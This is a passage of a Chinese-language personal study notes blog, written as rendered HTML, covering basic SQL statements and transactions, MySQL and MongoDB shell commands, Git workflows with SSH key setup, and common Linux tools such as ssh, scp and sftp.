class="keyword">SELECT</span></span><br><span class="line">    students.id <span class="keyword">sid</span>,</span><br><span class="line">    students.name,</span><br><span class="line">    students.gender,</span><br><span class="line">    students.score,</span><br><span class="line">    classes.id cid,</span><br><span class="line">    classes.name cname</span><br><span class="line"><span class="keyword">FROM</span> students, classes;</span><br><span class="line"><span class="comment">-- 增加条件</span></span><br><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">    s.id <span class="keyword">sid</span>,</span><br><span class="line">    s.name,</span><br><span class="line">    s.gender,</span><br><span class="line">    s.score,</span><br><span class="line">    c.id cid,</span><br><span class="line">    c.name cname</span><br><span class="line"><span class="keyword">FROM</span> students s, classes c</span><br><span class="line"><span class="keyword">WHERE</span> s.gender = <span class="string">'M'</span> <span class="keyword">AND</span> c.id = <span class="number">1</span>;</span><br></pre></td></tr></table></figure></li><li><p>连接查询</p><p>连接查询是另一种类型的多表查询。连接查询对多个表进行JOIN运算，简单地说，就是先确定一个主表作为结果集，然后，把其他表的行有选择性地“连接”在主表结果集上。</p></li></ul><h4 id="修改数据"><a href="#修改数据" class="headerlink" title="修改数据"></a>修改数据</h4><ul><li><p>INSERT</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> &lt;表名&gt; (字段<span class="number">1</span>, 字段<span class="number">2</span>, ...) <span class="keyword">VALUES</span> (值<span class="number">1</span>, 值<span class="number">2</span>, ...);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> students (class_id, <span class="keyword">name</span>, gender, score) <span class="keyword">VALUES</span> (<span class="number">2</span>, <span class="string">'大牛'</span>, <span class="string">'M'</span>, <span class="number">80</span>);</span><br><span class="line"><span class="comment">--字段顺序不必和数据库表的字段顺序一致，但值的顺序必须和字段顺序一致</span></span><br><span class="line"><span class="comment">--如果一个字段有默认值，那么在INSERT语句中也可以不出现</span></span><br></pre></td></tr></table></figure></li><li><p>UPDATE</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> &lt;表名&gt; <span class="keyword">SET</span> 字段<span class="number">1</span>=值<span class="number">1</span>, 字段<span class="number">2</span>=值<span class="number">2</span>, ... <span class="keyword">WHERE</span> ...;</span><br><span class="line"><span class="keyword">UPDATE</span> students <span class="keyword">SET</span> <span class="keyword">name</span>=<span class="string">'大牛'</span>, score=<span class="number">66</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">UPDATE</span> students <span class="keyword">SET</span> <span class="keyword">name</span>=<span class="string">'小牛'</span>, score=<span class="number">77</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>&gt;=<span class="number">5</span> <span class="keyword">AND</span> <span class="keyword">id</span>&lt;=<span class="number">7</span>;</span><br><span class="line"><span class="keyword">UPDATE</span> students <span class="keyword">SET</span> score=score+<span class="number">10</span> <span class="keyword">WHERE</span> score&lt;<span class="number">80</span>;</span><br><span class="line"><span class="keyword">UPDATE</span> students <span class="keyword">SET</span> score=<span class="number">100</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="number">999</span>;</span><br><span class="line"><span class="comment">--要特别小心的是，UPDATE语句可以没有WHERE条件</span></span><br><span class="line"><span class="keyword">UPDATE</span> students <span class="keyword">SET</span> score=<span class="number">60</span>;</span><br><span class="line"><span class="comment">--这时，整个表的所有记录都会被更新。所以，在执行UPDATE语句时要非常小心，最好先用SELECT语句来测试WHERE条件是否筛选出了期望的记录集，然后再用UPDATE更新</span></span><br></pre></td></tr></table></figure></li><li><p>DELETE</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> &lt;表名&gt; <span class="keyword">WHERE</span> ...;</span><br><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> students <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> students <span class="keyword">WHERE</span> <span class="keyword">id</span>&gt;=<span class="number">5</span> <span class="keyword">AND</span> <span class="keyword">id</span>&lt;=<span class="number">7</span>;</span><br><span class="line"><span class="comment">--和UPDATE类似，不带WHERE条件的DELETE语句会删除整个表的数据</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h4><p>在执行SQL语句的时候，某些业务要求，一系列操作必须全部执行，而不能仅执行一部分。例如，一个转账操作：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 从id=1的账户给id=2的账户转账100元</span></span><br><span class="line"><span class="comment">-- 第一步：将id=1的A账户余额减去100</span></span><br><span class="line"><span class="keyword">UPDATE</span> accounts <span class="keyword">SET</span> balance = balance - <span class="number">100</span> <span class="keyword">WHERE</span> <span class="keyword">id</span> = <span class="number">1</span>;</span><br><span class="line"><span class="comment">-- 第二步：将id=2的B账户余额加上100</span></span><br><span class="line"><span class="keyword">UPDATE</span> accounts <span class="keyword">SET</span> balance = balance + <span class="number">100</span> <span class="keyword">WHERE</span> <span class="keyword">id</span> = <span class="number">2</span>;</span><br></pre></td></tr></table></figure><p>这两条SQL语句必须全部执行，或者，由于某些原因，如果第一条语句成功，第二条语句失败，就必须全部撤销。</p><p>这种把多条语句作为一个整体进行操作的功能，被称为数据库<em>事务</em>。数据库事务可以确保该事务范围内的所有操作都可以全部成功或者全部失败。如果事务失败，那么效果就和没有执行这些SQL一样，不会对数据库数据有任何改动。</p><p><strong>RDBMS的特点：</strong></p><ul><li>数据以表格的形式出现</li><li>每行为各种记录名称</li><li>每列为记录名称所对应的数据域</li><li>许多的行和列组成一张表单</li><li>若干的表单组成database</li></ul><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><p><strong>常用命令</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 登录</span></span><br><span class="line">mysql -user root -password xxxx</span><br><span class="line">mysql -u root -p xxxx</span><br><span class="line">mysql -uroot -pxxxx</span><br><span class="line"></span><br><span class="line">ps -ef | grep mysqld# 检查是否启动</span><br><span class="line"></span><br><span class="line">CREATE DATABASE test;# 创建数据库</span><br><span class="line">DROP DATABASE test;# 删除数据库</span><br><span class="line">USE database_name;# 选择要操作的数据库，以后所有Mysql命令都只针对该数据库</span><br><span class="line">SHOW DATABASES;# 列出 MySQL 数据库管理系统的数据库列表</span><br><span class="line">SHOW TABLES;# 显示制定数据库的所有表</span><br><span class="line">CREATE TABLE students;# 创建表</span><br><span class="line">DROP TABLE students;# 删除表</span><br><span class="line">TRUNCATE table students;# 清空表</span><br><span class="line">DESC students;# 查看表结构</span><br><span class="line">SHOW CREATE TABLE students;# 查看创建表的 SQL 语句</span><br><span class="line">SHOW COLUMNS FROM table_name# 显示数据表的属性</span><br><span class="line">SHOW INDEX FROM table_name  # 显示数据表的详细索引信息，包括主键</span><br><span class="line"><span class="meta">#</span><span class="bash"> 输出Mysql数据库管理系统的性能及统计信息</span></span><br><span class="line">SHOW TABLE STATUS LIKE [FROM db_name] [LIKE 'pattern'] \G: </span><br><span class="line">SHOW TABLE STATUS  FROM RUNOOB;  # 显示数据库 RUNOOB 中所有表的信息</span><br><span class="line">SHOW TABLE STATUS from RUNOOB LIKE 'runoob%';       # 表名以runoob开头的表的信息</span><br><span class="line">SHOW TABLE STATUS from RUNOOB LIKE 'runoob%'\G;     # 加上 \G，查询结果按列打印</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 导入数据</span></span><br><span class="line">1</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash">use abc;</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"><span class="built_in">set</span> names utf8;</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"><span class="built_in">source</span> /home/abc/abc.sql;</span></span><br><span class="line">2</span><br><span class="line">mysql -u用户名 -p密码 数据库名 &lt; 数据库名.sql</span><br></pre></td></tr></table></figure><h2 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h2><p><a href="https://juejin.im/post/5add9e655188256735642122" target="_blank" rel="noopener">参考</a></p><p><strong>基本概念</strong>  </p><ul><li><code>数据库</code> MongoDB的单个实例可以容纳多个独立的数据库，比如一个学生管理系统就可以对应一个数据库实例。</li><li><code>集合</code> 数据库是由集合组成的，一个集合用来表示一个实体，如学生集合。</li><li><code>文档</code> 集合是由文档组成的，一个文档表示一条记录，比如一位同学张三就是一个文档</li></ul><p><strong>常用命令</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 服务端启动</span></span><br><span class="line">mkdir data  # 新建目录</span><br><span class="line">mongod --dbpath='./data'  # 指定数据库路径</span><br><span class="line">(waiting for connections on port 27017就表示启动成功)</span><br><span class="line">--port  指定服务端口号，默认端口27017</span><br><span class="line">--logpath  指定MongoDB日志文件，注意是指定文件不是目录</span><br><span class="line">--logappend  使用追加的方式写日志</span><br><span class="line">--dbpath  指定数据库路径</span><br><span class="line">--directoryperdb  设置每个数据库将被保存在一个单独的目录</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 客户端启动</span></span><br><span class="line">mongo (--host 127.0.0.1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 数据库操作</span></span><br><span class="line">show dbs# 显示所有数据库</span><br><span class="line">use school   # 选择数据库school</span><br><span class="line">db / db.getName()# 查看当前使用的数据库</span><br><span class="line">db.dropDatabase()# 删除数据库</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 集合操作</span></span><br><span class="line">db.school.help()# 查看帮助文档</span><br><span class="line">show collections# 查看数据库下的集合</span><br><span class="line">db.createCollection(collection_Name)# 创建一个集合</span><br><span class="line">db.collection_Name.insert(document)# 创建集合并插入文档</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 文档操作</span></span><br><span class="line">db.collection_name.insert(document)  # insert</span><br><span class="line">db.collection_name.save(document)# save</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 以后再看上面那个链接</span></span><br></pre></td></tr></table></figure><h2 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h2><h3 id="Git-提示fatal-remote-origin-already-exists"><a href="#Git-提示fatal-remote-origin-already-exists" class="headerlink" title="Git 提示fatal: remote origin already exists"></a>Git 提示fatal: remote origin already exists</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git remote rm orign</span><br><span class="line">git remote add origin https://github.com/wywwzjj/Note.git</span><br><span class="line"><span class="meta">#</span><span class="bash"> 如果还不行，手动修改gitconfig</span></span><br><span class="line">vi .git/config</span><br><span class="line"><span class="meta">#</span><span class="bash"> 把 [remote “origin”] 那一行删掉就好了</span></span><br></pre></td></tr></table></figure><h3 id="Create-new-repo"><a href="#Create-new-repo" class="headerlink" title="Create new repo"></a>Create new repo</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo "# Note" &gt;&gt; README.md</span><br><span class="line">git init</span><br><span class="line">git add README.md</span><br><span class="line">git commit -m "first commit"</span><br><span class="line">git remote add origin https://github.com/wywwzjj/Note.git</span><br><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure><h3 id="Push-an-existing-repository"><a href="#Push-an-existing-repository" class="headerlink" title="Push an existing repository"></a>Push an existing repository</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git remote add origin https://github.com/wywwzjj/Flask-Movies.git</span><br><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure><p>实战：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git remote add origin https://github.com/yourgithubID/gitRepo.git #建立远程仓库</span><br><span class="line">git checkout -b first-step</span><br><span class="line">git add .</span><br><span class="line">git status</span><br><span class="line">git commit -m " "</span><br><span class="line">git checkout master</span><br><span class="line">git merge first-step</span><br><span class="line">git push</span><br><span class="line">cap production deploy</span><br></pre></td></tr></table></figure><h3 id="常用的GitHub代码"><a href="#常用的GitHub代码" class="headerlink" title="常用的GitHub代码"></a>常用的GitHub代码</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git pull origin master    # 从云端获得最新版本</span><br><span class="line">git clone  # 本地如果无远程代码，先做这步，不然就忽略</span><br><span class="line">git status  # 查看本地自己修改了多少文件</span><br><span class="line">git add . # 添加远程不存在的git文件</span><br><span class="line">git add -A  # 把项目中的所有文件都放到仓库</span><br><span class="line">git commit -m "commit-info"# 提交修改</span><br><span class="line">git push origin master # 更新到远程服务器上</span><br><span class="line">git rm  # 移除文件</span><br><span class="line">git log  # 查看提交历史</span><br></pre></td></tr></table></figure><h3 id="删除操作"><a href="#删除操作" class="headerlink" title="删除操作"></a>删除操作</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git pull origin master                  # 将远程仓库里面的项目拉下来</span><br><span class="line">dir                                     # 查看有哪些文件夹</span><br><span class="line">git rm -r --cached target               # 删除target文件夹</span><br><span class="line">git commit -m '删除了target'             # 提交,添加操作说明</span><br><span class="line">git push -u origin master               # 将本次更改更新到github项目上去</span><br></pre></td></tr></table></figure><h3 id="误删撤回（未提交时）"><a href="#误删撤回（未提交时）" class="headerlink" title="误删撤回（未提交时）"></a>误删撤回（未提交时）</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -f  // 强制撤销</span><br></pre></td></tr></table></figure><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>首先在本地创建ssh key；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C "your_email@youremail.com"</span><br><span class="line"><span class="meta">#</span><span class="bash"> 然后一路回车</span></span><br><span class="line">cat ~/.ssh/id_rsa.pub  # 复制里面的key</span><br></pre></td></tr></table></figure><p>进入 GitHub 上的 Account Settings（账户配置），左边选择SSH and GPG keys，粘贴 key。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com  # 验证是否成功</span><br></pre></td></tr></table></figure><p>如果是第一次的会提示是否continue，输入yes就会看到：You’ve successfully authenticated, but GitHub does not provide shell access 。这就表示已成功连上github。</p><p>接下来我们要做的就是把本地仓库传到github上去，在此之前还需要设置username和email，因为github每次commit都会记录他们。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name "your name"</span><br><span class="line">git config --global user.email "your_email@youremail.com"</span><br><span class="line">git config --global credential.helper store # 避免 git push 时重复输密码</span><br></pre></td></tr></table></figure><p>进入要上传的仓库，右键git bash，添加远程地址：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote add origin git@github.com:yourName/yourRepo.git</span><br></pre></td></tr></table></figure><p>后面的yourName和yourRepo表示你再github的用户名和刚才新建的仓库，加完之后进入.git，打开config，这里会多出一个remote “origin”内容，这就是刚才添加的远程地址，也可以直接修改config来配置远程地址。</p><p>创建新文件夹，打开，然后执行 git init 以创建新的 git 仓库。</p><h3 id="检出仓库"><a href="#检出仓库" class="headerlink" title="检出仓库"></a>检出仓库</h3><p>执行如下命令以创建一个本地仓库的克隆版本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone /path/to/repository</span><br></pre></td></tr></table></figure><p>如果是远端服务器上的仓库，你的命令会是这个样子：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone username@host:/path/to/repository</span><br></pre></td></tr></table></figure><h3 id="工作流"><a href="#工作流" class="headerlink" title="工作流"></a>工作流</h3><p>你的本地仓库由 git 维护的三棵”树”组成。第一个是你的 工作目录，它持有实际文件；第二个是 暂存区（Index），它像个缓存区域，临时保存你的改动；最后是 HEAD，它指向你最后一次提交的结果。</p><p>你可以提出更改（把它们添加到暂存区），使用如下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git add &lt;filename&gt;</span><br><span class="line">git add *</span><br></pre></td></tr></table></figure><p>这是 git 基本工作流程的第一步；使用如下命令以实际提交改动：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -m "代码提交信息"</span><br></pre></td></tr></table></figure><p>现在，你的改动已经提交到了 HEAD，但是还没到你的远端仓库。 推送改动 你的改动现在已经在本地仓库的 HEAD 中了。执行如下命令以将这些改动提交到远端仓库：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push origin master</span><br></pre></td></tr></table></figure><p>可以把 master 换成你想要推送的任何分支。<br>如果你还没有克隆现有仓库，并欲将你的仓库连接到某个远程服务器，你可以使用如下命令添加：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote add origin &lt;server&gt;</span><br></pre></td></tr></table></figure><p>如此你就能够将你的改动推送到所添加的服务器上去了。</p><h3 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h3><p>分支是用来将特性开发绝缘开来的。在你创建仓库的时候，master 是”默认的”分支。在其他分支上进行开发，完成后再将它们合并到主分支上。<br>创建一个叫做”feature_x”的分支，并切换过去：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b feature_x</span><br></pre></td></tr></table></figure><p>切换回主分支：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout master</span><br></pre></td></tr></table></figure><p>合并到主分支:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git merge feature_x</span><br></pre></td></tr></table></figure><p>再把新建的分支删掉：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch -d feature_x</span><br></pre></td></tr></table></figure><p>除非你将分支推送到远端仓库，不然该分支就是 不为他人所见的：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push origin &lt;branch&gt;</span><br></pre></td></tr></table></figure><p>更新与合并 要更新你的本地仓库至最新改动，执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull</span><br></pre></td></tr></table></figure><p>以在你的工作目录中 获取（fetch） 并 合并（merge） 远端的改动。 要合并其他分支到你的当前分支（例如 master），执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git merge &lt;branch&gt;</span><br></pre></td></tr></table></figure><p>在这两种情况下，git 都会尝试去自动合并改动。遗憾的是，这可能并非每次都成功，并可能出现冲突（conflicts）。 这时候就<br>需要你修改这些文件来手动合并这些冲突（conflicts）。改完之后，你需要执行如下命令以将它们标记为合并成功：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add &lt;filename&gt;</span><br></pre></td></tr></table></figure><p>在合并改动之前，你可以使用如下命令预览差异：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff &lt;source_branch&gt; &lt;target_branch&gt;</span><br></pre></td></tr></table></figure><h3 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h3><p>为软件发布创建标签是推荐的。这个概念早已存在，在 SVN 中也有。你可以执行如下命令创建一个叫做 1.0.0 的标签：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git tag 1.0.0 1b2e1d63ff</span><br></pre></td></tr></table></figure><p>1b2e1d63ff 是你想要标记的提交 ID 的前 10 位字符。可以使用下列命令获取提交 ID：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git log</span><br></pre></td></tr></table></figure><p>你也可以使用少一点的提交 ID 前几位，只要它的指向具有唯一性。</p><p>替换本地改动 假如你操作失误（当然，这最好永远不要发生），你可以使用如下命令替换掉本地改动：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -- &lt;filename&gt;</span><br></pre></td></tr></table></figure><p>此命令会使用 HEAD 中的最新内容替换掉你的工作目录中的文件。已添加到暂存区的改动以及新文件都不会受到影响。</p><p>假如你想丢弃你在本地的所有改动与提交，可以到服务器上获取最新的版本历史，并将你本地主分支指向它：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git fetch origin</span><br><span class="line">git reset --hard origin/master</span><br></pre></td></tr></table></figure><p>实用小贴士 内建的图形化 git：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gitk</span><br></pre></td></tr></table></figure><p>彩色的 git 输出：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config color.ui true</span><br></pre></td></tr></table></figure><p>显示历史记录时，每个提交的信息只显示一行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config format.pretty oneline</span><br></pre></td></tr></table></figure><p>交互式添加文件到暂存区：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add -i</span><br></pre></td></tr></table></figure><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="常用命令-1"><a href="#常用命令-1" class="headerlink" title="常用命令"></a>常用命令</h3><ul><li>netcat</li><li>ssh</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen  # 默认在当前用户目录下创建.ssh文件夹：公钥 id_rsa.pub 私钥 id_rsa</span><br><span class="line">ssh -i Key user@host  # 用私钥登陆，Key需要改权限 600</span><br><span class="line">ssh user@host</span><br></pre></td></tr></table></figure><p>​    与 scp 共同的参数<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">`-P`:数据传输默认端口，默认是22</span><br><span class="line">`-r`:递归拷贝整个目录</span><br><span class="line">`-i`:指定密钥文件，参数直接传递给ssh使用</span><br><span class="line">`-l`:限定网速，以Kbit/s为单位</span><br><span class="line">`-C`:允许压缩</span><br><span class="line">`-1,-2`:强制scp命令使用ssh1或者ssh2协议</span><br><span class="line">`-4,-6`:使用ipv4或者ipv6寻址</span><br></pre></td></tr></table></figure></p><ul><li><p>scp            </p><p>  基于 ssh 登录进行安全的远程文件拷贝命令</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">scp config/master.key treenewbee@45.79.84.153:/home/config  # 发送给远程机</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 本地发给远程</span></span><br><span class="line">scp file user@host:folder      # 单个文件</span><br><span class="line">scp -r folder user@host:folder# 整个目录  `-r`:递归拷贝整个目录</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 远程复制到本地</span></span><br><span class="line">scp -r -i privateKey root@IP:remote_folder local_folder</span><br><span class="line">`-i`:指定密钥文件，参数直接传递给ssh使用</span><br></pre></td></tr></table></figure><ul><li>apt</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dpkg --list  # 已装软件</span><br><span class="line">sudo apt-get remove &lt;programname&gt;# 只卸载软件，保留配置文件和数据</span><br><span class="line">sudo apt-get purge / apt-get --purge remove # 完全卸载干净</span><br></pre></td></tr></table></figure><ul><li>tar</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar xvf filename  # 解压</span><br><span class="line">tar cvf filename  # 打包</span><br></pre></td></tr></table></figure><ul><li>sftp</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">SFTP,即 SSH 文件传输协议，利用安全的连接传输文件，还可遍历本地和远程系上的文件系统</span><br><span class="line">ssh username@remote_hostname_or_IP</span><br><span class="line"><span class="meta">#</span><span class="bash"> 成功后提示符将变为 &gt; </span></span><br><span class="line"></span><br><span class="line">help / ?  # 打开帮助</span><br><span class="line">Available commands:</span><br><span class="line">bye                                Quit sftp</span><br><span class="line">cd path                            Change remote directory to 'path'</span><br><span class="line">chgrp grp path                     Change group of file 'path' to 'grp'</span><br><span class="line">chmod mode path                    Change permissions of file 'path' to 'mode'</span><br><span class="line">chown own path                     Change owner of file 'path' to 'own'</span><br><span class="line">df [-hi] [path]                    Display statistics for current directory or</span><br><span class="line">                                   filesystem containing 'path'</span><br><span class="line">exit                               Quit 